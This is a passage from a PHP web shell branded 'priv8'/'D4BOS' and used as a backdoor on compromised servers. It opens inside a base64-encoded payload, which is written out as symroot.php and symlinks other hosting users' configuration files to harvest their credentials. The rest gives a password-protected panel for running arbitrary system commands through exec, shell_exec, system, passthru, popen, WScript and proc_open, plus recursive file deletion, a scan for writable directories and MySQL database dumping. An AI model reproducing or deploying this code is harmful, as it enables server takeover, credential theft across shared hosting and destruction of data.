dWRlcy9jb25maWcucGhwIiwiaW5jbHVkZXMvY29uZmlnLnBocCIsImNvbmZfZ2xvYmFsLnBocCIsImluYy9jb25maWcucGhwIiwiY29uZmlnLnBocCIsIlNldHRpbmdzLnBocCIsInNpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwIiwid2htL2NvbmZpZ3VyYXRpb24ucGhwIiwid2htY3MvY29uZmlndXJhdGlvbi5waHAiLCJzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwIiwid2htYy9XSE0vY29uZmlndXJhdGlvbi5waHAiLCJ3aG0vV0hNQ1MvY29uZmlndXJhdGlvbi5waHAiLCJ3aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAiLCJzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwIiwiY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCIsImNsaWVudC9jb25maWd1cmF0aW9uLnBocCIsImNsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwIiwiY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCIsImNsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAiLCJiaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwIiwiYWRtaW4vY29uZmlnLnBocCIpOwoJCWZvcmVhY2goJHVzciBhcyAkdXNzICkKCQl7CgkJCSR1cz10cmltKCR1c3MpOwoJCQkJCQkKCQkJZm9yZWFjaCgkY29uZmlndXJhdGlvbiBhcyAkYykKCQkJewoJCQkgJHJzPSIvaG9tZS8iLiR1cy4iL3B1YmxpY19odG1sLyIuJGM7CgkJCSAkcj0ic3ltLyIuJHVzLiIgLi4gIi4kYzsKCQkJIHN5bWxpbmsoJHJzLCRyKTsKCQkJCgkJfQoJCQkKCQkJfQoJCQoJCQoJCX0KCQoJCgkKCT8+CjwvY2VudGVyPgk=
';
    $file       = fopen("symroot.php", "w+");
    $write      = fwrite($file, base64_decode($perltoolss));
    fclose($file);
    echo "<iframe src=symroot.php width=100% height=720px frameborder=0></iframe> ";
}
if ($action == 'shell') {
    if (IS_WIN && IS_COM) {
        if ($program && $parameter) {
            $shell = new COM('Shell.Application');
            $a     = $shell->ShellExecute($program, $parameter);
            m('Program run has ' . (!$a ? 'success' : 'fail'));
        }
        !$program && $program = 'c:\indows\ystem32\md.exe';
        !$parameter && $parameter = '/c net start > ' . SA_ROOT . 'log.txt';
        formhead(array(
            'title' => 'Execute Program'
        ));
        makehide('action', 'shell');
        makeinput(array(
            'title' => 'Program',
            'name' => 'program',
            'value' => $program,
            'newline' => 1
        ));
        p('<p>');
        makeinput(array(
            'title' => 'Parameter',
            'name' => 'parameter',
            'value' => $parameter
        ));
        makeinput(array(
            'name' => 'submit',
            'class' => 'bt',
            'type' => 'submit',
            'value' => 'Execute'
        ));
        p('</p>');
        formfoot();
    }
    formhead(array(
        'title' => 'Execute Command'
    ));
    makehide('action', 'shell');
    if (IS_WIN && IS_COM) {
        $execfuncdb = array(
            'phpfunc' => 'phpfunc',
            'wscript' => 'wscript',
            'proc_open' => 'proc_open'
        );
        makeselect(array(
            'title' => 'Use:',
            'name' => 'execfunc',
            'option' => $execfuncdb,
            'selected' => $execfunc,
            'newline' => 1
        ));
    }
    p('<p>');
    makeinput(array(
        'title' => 'Command',
        'name' => 'command',
        'value' => $command
    ));
    makeinput(array(
        'name' => 'submit',
        'class' => 'bt',
        'type' => 'submit',
        'value' => 'Execute'
    ));
    p('</p>');
    formfoot();
    if ($command) {
        p('<hr width="100%" noshade /><pre>');
        if ($execfunc == 'wscript' && IS_WIN && IS_COM) {
            $wsh       = new COM('WScript.shell');
            $exec      = $wsh->exec('cmd.exe /c ' . $command);
            $stdout    = $exec->StdOut();
            $stroutput = $stdout->ReadAll();
            echo $stroutput;
        } elseif ($execfunc == 'proc_open' && IS_WIN && IS_COM) {
            $descriptorspec = array(
                0 => array(
                    'pipe',
                    'r'
                ),
                1 => array(
                    'pipe',
                    'w'
                ),
                2 => array(
                    'pipe',
                    'w'
                )
            );
            $process        = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
            if (is_resource($process)) {
                fwrite($pipes[0], $command . "
");
                fwrite($pipes[0], "exit
");
                fclose($pipes[0]);
                while (!feof($pipes[1])) {
                    echo fgets($pipes[1], 1024);
                }
                fclose($pipes[1]);
                while (!feof($pipes[2])) {
                    echo fgets($pipes[2], 1024);
                }
                fclose($pipes[2]);
                proc_close($process);
            }
        } else {
            echo (execute($command));
        }
        p('</pre>');
    }
}
?></td></tr></table>
<div style="padding:10px;border-bottom:1px solid #0E0E0E;border-top:1px solid #0E0E0E;background:#0E0E0E;">
	<span style="float:right;"><?php
debuginfo();
ob_end_flush();
?></span>
	Copyright @ 2013 By: a <a href=http://www.cyberizm.org target=_blank><B>.:: priv8 ::. </B></a>
</div>
</body>
</html>
<?php
function m($msg)
{
    echo '<div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">';
    echo $msg;
    echo '</div>';
}
function scookie($key, $value, $life = 0, $prefix = 1)
{
    global $admin, $timestamp, $_SERVER;
    $key     = ($prefix ? $admin['cookiepre'] : '') . $key;
    $life    = $life ? $life : $admin['cookielife'];
    $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
    setcookie($key, $value, $timestamp + $life, $admin['cookiepath'], $admin['cookiedomain'], $useport);
}
function multi($num, $perpage, $curpage, $tablename)
{
    $multipage = '';
    if ($num > $perpage) {
        $page   = 10;
        $offset = 5;
        $pages  = @ceil($num / $perpage);
        if ($page > $pages) {
            $from = 1;
            $to   = $pages;
        } else {
            $from = $curpage - $offset;
            $to   = $curpage + $page - $offset - 1;
            if ($from < 1) {
                $to   = $curpage + 1 - $from;
                $from = 1;
                if (($to - $from) < $page && ($to - $from) < $pages) {
                    $to = $page;
                }
            } elseif ($to > $pages) {
                $from = $curpage - $pages + $to;
                $to   = $pages;
                if (($to - $from) < $page && ($to - $from) < $pages) {
                    $from = $pages - $page + 1;
                }
            }
        }
        $multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\'' . $tablename . '\', \'\', 1);">First</a> ' : '') . ($curpage > 1 ? '<a href="javascript:settable(\'' . $tablename . '\', \'\', ' . ($curpage - 1) . ');">Prev</a> ' : '');
        for ($i = $from; $i <= $to; $i++) {
            $multipage .= $i == $curpage ? $i . ' ' : '<a href="javascript:settable(\'' . $tablename . '\', \'\', ' . $i . ');">[' . $i . ']</a> ';
        }
        $multipage .= ($curpage < $pages ? '<a href="javascript:settable(\'' . $tablename . '\', \'\', ' . ($curpage + 1) . ');">Next</a>' : '') . ($to < $pages ? ' <a href="javascript:settable(\'' . $tablename . '\', \'\', ' . $pages . ');">Last</a>' : '');
        $multipage = $multipage ? '<p>Pages: ' . $multipage . '</p>' : '';
    }
    return $multipage;
}
function loginpage()
{
?><html>
<head>

<body bgcolor=black background=1.jpg>

		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>.::  priv8 ::. </title>
<style type="text/css">
A:link {text-decoration: none; color: green }
A:visited {text-decoration: none;color:red}
A:active {text-decoration: none}
A:hover {text-decoration: underline; color: green;}
input, textarea, button
{
	font-size: 11pt;
	color: 	#FFFFFF;
	font-family: verdana, sans-serif;
	background-color: #000000;
	border-left: 2px dashed #8B0000;
	border-top: 2px dashed #8B0000;
	border-right: 2px dashed #8B0000;
	border-bottom: 2px dashed #8B0000;
}

</style>

      
       <BR><BR>
<div align=center >
<fieldset style="border: 1px solid rgb(69, 69, 69); padding: 4px;width:450px;bgcolor:white;align:center;font-family:tahoma;font-size:10pt"><legend><font color=red><B>Giriş</b></font></legend>

<div>
<font color=#99CC33>
<font color=#33ff00>==[ <B>D4BOS ]== </font><BR><BR>

<form method="POST" action="">
	<span style="font:10pt tahoma;">Sifre : </span><input name="password" type="password" size="20">
	<input type="hidden" name="doing" value="login">
	<input type="submit" value="Login">
	</form>
<BR>
<B><font color=#FFFFFF>
<a href=https://d4bos.wordpress.com/ target=_blank>priv8</a><BR></b>
</div>
	</fieldset>
</head>
</html>
<?php
    exit;
}
function execute($cfe)
{
    $res = '';
    if ($cfe) {
        if (function_exists('exec')) {
            @exec($cfe, $res);
            $res = join("
", $res);
        } elseif (function_exists('shell_exec')) {
            $res = @shell_exec($cfe);
        } elseif (function_exists('system')) {
            @ob_start();
            @system($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif (function_exists('passthru')) {
            @ob_start();
            @passthru($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif (@is_resource($f = @popen($cfe, "r"))) {
            $res = '';
            while (!@feof($f)) {
                $res .= @fread($f, 1024);
            }
            @pclose($f);
        }
    }
    return $res;
}
function which($pr)
{
    $path = execute("which $pr");
    return ($path ? $path : $pr);
}
function cf($fname, $text)
{
    if ($fp = @fopen($fname, 'w')) {
        @fputs($fp, @base64_decode($text));
        @fclose($fp);
    }
}
function debuginfo()
{
    global $starttime;
    $mtime     = explode(' ', microtime());
    $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
    echo 'Processed in ' . $totaltime . ' second(s)';
}
function dbconn($dbhost, $dbuser, $dbpass, $dbname = '', $charset = '', $dbport = '3306')
{
    if (!$link = @mysql_connect($dbhost . ':' . $dbport, $dbuser, $dbpass)) {
        p('<h2>Can not connect to MySQL server</h2>');
        exit;
    }
    if ($link && $dbname) {
        if (!@mysql_select_db($dbname, $link)) {
            p('<h2>Database selected has error</h2>');
            exit;
        }
    }
    if ($link && mysql_get_server_info() > '4.1') {
        if (in_array(strtolower($charset), array(
            'gbk',
            'big5',
            'utf8'
        ))) {
            q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
        }
    }
    return $link;
}
function s_array(&$array)
{
    if (is_array($array)) {
        foreach ($array as $k => $v) {
            $array[$k] = s_array($v);
        }
    } else if (is_string($array)) {
        $array = stripslashes($array);
    }
    return $array;
}
function html_clean($content)
{
    $content = htmlspecialchars($content);
    $content = str_replace("\n", "<br />", $content);
    $content = str_replace("  ", "&nbsp;&nbsp;", $content);
    $content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
    return $content;
}
function getChmod($filepath)
{
    return substr(base_convert(@fileperms($filepath), 10, 8), -4);
}
function getPerms($filepath)
{
    $mode = @fileperms($filepath);
    if (($mode & 0xC000) === 0xC000) {
        $type = 's';
    } elseif (($mode & 0x4000) === 0x4000) {
        $type = 'd';
    } elseif (($mode & 0xA000) === 0xA000) {
        $type = 'l';
    } elseif (($mode & 0x8000) === 0x8000) {
        $type = '-';
    } elseif (($mode & 0x6000) === 0x6000) {
        $type = 'b';
    } elseif (($mode & 0x2000) === 0x2000) {
        $type = 'c';
    } elseif (($mode & 0x1000) === 0x1000) {
        $type = 'p';
    } else {
        $type = '?';
    }
    $owner['read']    = ($mode & 00400) ? 'r' : '-';
    $owner['write']   = ($mode & 00200) ? 'w' : '-';
    $owner['execute'] = ($mode & 00100) ? 'x' : '-';
    $group['read']    = ($mode & 00040) ? 'r' : '-';
    $group['write']   = ($mode & 00020) ? 'w' : '-';
    $group['execute'] = ($mode & 00010) ? 'x' : '-';
    $world['read']    = ($mode & 00004) ? 'r' : '-';
    $world['write']   = ($mode & 00002) ? 'w' : '-';
    $world['execute'] = ($mode & 00001) ? 'x' : '-';
    if ($mode & 0x800) {
        $owner['execute'] = ($owner['execute'] == 'x') ? 's' : 'S';
    }
    if ($mode & 0x400) {
        $group['execute'] = ($group['execute'] == 'x') ? 's' : 'S';
    }
    if ($mode & 0x200) {
        $world['execute'] = ($world['execute'] == 'x') ? 't' : 'T';
    }
    return $type . $owner['read'] . $owner['write'] . $owner['execute'] . $group['read'] . $group['write'] . $group['execute'] . $world['read'] . $world['write'] . $world['execute'];
}
function getUser($filepath)
{
    if (function_exists('posix_getpwuid')) {
        $array = @posix_getpwuid(@fileowner($filepath));
        if ($array && is_array($array)) {
            return ' / <a href="#" title="User: ' . $array['name'] . '&#13&#10Passwd: ' . $array['passwd'] . '&#13&#10Uid: ' . $array['uid'] . '&#13&#10gid: ' . $array['gid'] . '&#13&#10Gecos: ' . $array['gecos'] . '&#13&#10Dir: ' . $array['dir'] . '&#13&#10Shell: ' . $array['shell'] . '">' . $array['name'] . '</a>';
        }
    }
    return '';
}
function deltree($deldir)
{
    $mydir = @dir($deldir);
    while ($file = $mydir->read()) {
        if ((is_dir($deldir . '/' . $file)) && ($file != '.') && ($file != '..')) {
            @chmod($deldir . '/' . $file, 0777);
            deltree($deldir . '/' . $file);
        }
        if (is_file($deldir . '/' . $file)) {
            @chmod($deldir . '/' . $file, 0777);
            @unlink($deldir . '/' . $file);
        }
    }
    $mydir->close();
    @chmod($deldir, 0777);
    return @rmdir($deldir) ? 1 : 0;
}
function bg()
{
    global $bgc;
    return ($bgc++ % 2 == 0) ? 'alt1' : 'alt2';
}
function getPath($scriptpath, $nowpath)
{
    if ($nowpath == '.') {
        $nowpath = $scriptpath;
    }
    $nowpath = str_replace('\\', '/', $nowpath);
    $nowpath = str_replace('//', '/', $nowpath);
    if (substr($nowpath, -1) != '/') {
        $nowpath = $nowpath . '/';
    }
    return $nowpath;
}
function getUpPath($nowpath)
{
    $pathdb = explode('/', $nowpath);
    $num    = count($pathdb);
    if ($num > 2) {
        unset($pathdb[$num - 1], $pathdb[$num - 2]);
    }
    $uppath = implode('/', $pathdb) . '/';
    $uppath = str_replace('//', '/', $uppath);
    return $uppath;
}
function getcfg($varname)
{
    $result = get_cfg_var($varname);
    if ($result == 0) {
        return 'No';
    } elseif ($result == 1) {
        return 'Yes';
    } else {
        return $result;
    }
}
function getfun($funName)
{
    return (false !== function_exists($funName)) ? 'Yes' : 'No';
}
function GetList($dir)
{
    global $dirdata, $j, $nowpath;
    !$j && $j = 1;
    if ($dh = opendir($dir)) {
        while ($file = readdir($dh)) {
            $f = str_replace('//', '/', $dir . '/' . $file);
            if ($file != '.' && $file != '..' && is_dir($f)) {
                if (is_writable($f)) {
                    $dirdata[$j]['filename']    = str_replace($nowpath, '', $f);
                    $dirdata[$j]['mtime']       = @date('Y-m-d H:i:s', filemtime($f));
                    $dirdata[$j]['dirchmod']    = getChmod($f);
                    $dirdata[$j]['dirperm']     = getPerms($f);
                    $dirdata[$j]['dirlink']     = ue($dir);
                    $dirdata[$j]['server_link'] = $f;
                    $dirdata[$j]['client_link'] = ue($f);
                    $j++;
                }
                GetList($f);
            }
        }
        closedir($dh);
        clearstatcache();
        return $dirdata;
    } else {
        return array();
    }
}
function qy($sql)
{
    $res = $error = '';
    if (!$res = @mysql_query($sql)) {
        return 0;
    } else if (is_resource($res)) {
        return 1;
    } else {
        return 2;
    }
    return 0;
}
function q($sql)
{
    return @mysql_query($sql);
}
function fr($qy)
{
    mysql_free_result($qy);
}
function sizecount($size)
{
    if ($size > 1073741824) {
        $size = round($size / 1073741824 * 100) / 100 . ' G';
    } elseif ($size > 1048576) {
        $size = round($size / 1048576 * 100) / 100 . ' M';
    } elseif ($size > 1024) {
        $size = round($size / 1024 * 100) / 100 . ' K';
    } else {
        $size = $size . ' B';
    }
    return $size;
}
class PHPZip
{
    var $out = '';
    function PHPZip($dir)
    {
        if (@function_exists('gzcompress')) {
            $curdir = getcwd();
            if (is_array($dir))
                $filelist = $dir;
            else {
                $filelist = $this->GetFileList($dir);
                foreach ($filelist as $k => $v)
                    $filelist[] = substr($v, strlen($dir) + 1);
            }
            if ((!empty($dir)) && (!is_array($dir)) && (file_exists($dir)))
                chdir($dir);
            else
                chdir($curdir);
            if (count($filelist) > 0) {
                foreach ($filelist as $filename) {
                    if (is_file($filename)) {
                        $fd      = fopen($filename, 'r');
                        $content = @fread($fd, filesize($filename));
                        fclose($fd);
                        if (is_array($dir))
                            $filename = basename($filename);
                        $this->addFile($content, $filename);
                    }
                }
                $this->out = $this->file();
                chdir($curdir);
            }
            return 1;
        } else
            return 0;
    }
    function GetFileList($dir)
    {
        static $a;
        if (is_dir($dir)) {
            if ($dh = opendir($dir)) {
                while ($file = readdir($dh)) {
                    if ($file != '.' && $file != '..') {
                        $f = $dir . '/' . $file;
                        if (is_dir($f))
                            $this->GetFileList($f);
                        $a[] = $f;
                    }
                }
                closedir($dh);
            }
        }
        return $a;
    }
    var $datasec = array();
    var $ctrl_dir = array();
    var $eof_ctrl_dir = "\50\4b\05\06\00\00\00\00";
    var $old_offset = 0;
    function unix2DosTime($unixtime = 0)
    {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7] . '\x' . $dtime[4] . $dtime[5] . '\x' . $dtime[2] . $dtime[3] . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr = "\x50\x4b\x03\x04";
        $fr .= "\x14\x00";
        $fr .= "\x00\x00";
        $fr .= "\x08\x00";
        $fr .= $hexdtime;
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $c_len   = strlen($zdata);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);
        $fr .= pack('v', strlen($name));
        $fr .= pack('v', 0);
        $fr .= $name;
        $fr .= $zdata;
        $fr .= pack('V', $crc);
        $fr .= pack('V', $c_len);
        $fr .= pack('V', $unc_len);
        $this->datasec[] = $fr;
        $new_offset      = strlen(implode('', $this->datasec));
        $cdrec           = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x14\x00";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x08\x00";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name));
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('v', 0);
        $cdrec .= pack('V', 32);
        $cdrec .= pack('V', $this->old_offset);
        $this->old_offset = $new_offset;
        $cdrec .= $name;
        $this->ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this->datasec);
        $ctrldir = implode('', $this->ctrl_dir);
        return $data . $ctrldir . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\00\00";
    }
}
function sqldumptable($table, $fp = 0)
{
    $tabledump = "DROP TABLE IF EXISTS $table;
";
    $tabledump .= "CREATE TABLE $table (
";
    $firstfield = 1;
    $fields     = q("SHOW FIELDS FROM $table");
    while ($field = mysql_fetch_array($fields)) {
        if (!$firstfield) {
            $tabledump .= ",
";
        } else {
            $firstfield = 0;
        }
        $tabledump .= "   $field[Field] $field[Type]";
        if (!empty($field["Default"])) {
            $tabledump .= " DEFAULT '$field[Default]'";
        }
        if ($field['Null'] != "YES") {
            $tabledump .= " NOT NULL";
        }
        if ($field['Extra'] != "") {
            $tabledump .= " $field[Extra]";
        }
    }
    fr($fields);
    $keys = q("SHOW KEYS FROM $table");
    while ($key = mysql_fetch_array($keys)) {
        $kname = $key['Key_name'];
        if ($kname != "PRIMARY" && $key['Non_unique'] == 0) {
            $kname = "UNIQUE|$kname";
        }
        if (!is_array($index[$kname])) {
            $index[$kname] = array();
        }
        $index[$kname][] = $key['Column_name'];
    }
    fr($keys);
    while (list($kname, $columns) = @each($index)) {
        $tabledump .= ",
";
        $colnames = implode($columns, ",");
        if ($kname == "PRIMARY") {
            $tabledump .= "   PRIMARY KEY ($colnames)";
        } else {
            if (substr($kname, 0, 6) == "UNIQUE") {
                $kname = substr($kname, 7);
            }
            $tabledump .= "   KEY $kname ($colnames)";
        }
    }
    $tabledump .= "
);

";
    if ($fp) {
        fwrite($fp, $tabledump);
    } else {
        echo $tabledump;
    }
    $rows      = q("SELECT * FROM $table");
    $numfields = mysql_num_fields($rows);
    while ($row = mysql_fetch_array($rows)) {
        $tabledump    = "INSERT INTO $table VALUES(";
        $fieldcounter = -1;
        $firstfield   = 1;
        while (++$fieldcounter < $numfields) {
            if (!$firstfield) {
                $tabledump .= ", ";
            } else {
                $firstfield = 0;
            }
            if (!isset($row[$fieldcounter])) {
                $tabledump .= "NULL";
            } else {
                $tabledump .= "'" . mysql_escape_string($row[$fieldcounter]) . "'";
            }
        }
        $tabledump .= ");
";
        if ($fp) {
            fwrite($fp, $tabledump);
        } else {
            echo $tabledump;
        }
    }
    fr($rows);
    if ($fp) {
        fwrite($fp, "
");
    } else {
        echo "
";
    }
}
function ue($str)
{
    return urlencode($str);
}
function p($str)
{
    echo $str . "
";
}
function tbhead()
{
    p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
}
function tbfoot()
{
    p('</table>');
}
function makehide($name, $value = '')
{
  p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}
function makeinput($arg = array())
{
    $arg['size']  = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
    $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
    !$arg['type'] && $arg['type'] = 'text';
    $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
    $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
    if ($arg['newline']) {
        p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
    } else {
        p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
    }
}
function makeselect($arg = array())
{
    if ($arg['onchange']) {
        $onchange = 'onchange="' . $arg['onchange'] . '"';
    }
    $arg['title'] = $arg['title'] ? $arg['title'] : '';
    if ($arg['newline'])
        p('<p>');
    p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
    if (is_array($arg['option'])) {
        foreach ($arg['option'] as $key => $value) {
            if ($arg['selected'] == $key) {
                p("<option value=\"$key\" selected>$value</option>");
            } else {
                p("<option value=\"$key\">$value</option>");
            }
        }
    }
    p("</select>");
    if ($arg['newline'])
        p('</p>');
}
function formhead($arg = array())
{
    !$arg['method'] && $arg['method'] = 'post';
    !$arg['action'] && $arg['action'] = $self;
    $arg['target'] = $arg['target'] ? "target=\$arg[target]\"" : '';
    !$arg['name'] && $arg['name'] = 'form1';
    p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
    if ($arg['title']) {
        p('<h2>' . $arg['title'] . ' &raquo;</h2>');
    }
}
function maketext($arg = array())
{
    !$arg['cols'] && $arg['cols'] = 100;
    !$arg['rows'] && $arg['rows'] = 25;
    $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
    p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
}
function formfooter($name = '')
{
    !$name && $name = 'submit';
    p('<p><input class="bt" name="' . $name . '" id=\"' . $name . '\" type="submit" value="Submit"></p>');
    p('</form>');
}
function formfoot()
{
    p('</form>');
}
function pr($a)
{
    echo '<pre>';
    print_r($a);
    echo '</pre>';
}
?>